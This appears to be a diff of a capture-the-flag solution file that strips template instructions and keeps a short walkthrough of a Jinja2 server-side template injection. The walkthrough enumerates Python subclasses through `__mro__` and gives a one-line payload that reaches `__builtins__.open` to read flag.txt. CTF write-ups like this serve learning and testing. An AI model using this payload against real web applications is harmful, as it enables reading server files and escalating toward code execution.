@@ -1,14 +1,5 @@
 # How to Solve the Challenge?
 
-Provide reproducible steps to solve the challenge. This can include:
-
-- Runnable code (e.g., `PoC.py`)
-- A Bash script or a sequence of commented commands
-- Well-explained instructions
-- ...
-
-Ensure that all dependencies required to build or run the solution are provided (e.g., `requirements.txt`) or thoroughly documented.
-
 Steps:
 
 1.  `{{''.__class__.__mro__[1].__subclasses__()}}` produces a list of subclasses available we must find the index of the one we want to use.
@@ -18,3 +9,4 @@ Steps:
 
 One Step PAYLOAD:
 `{{ ''.__class__.__mro__[1].__subclasses__()[N].__init__.__globals__.__builtins__.open("flag.txt").read()}}`
+
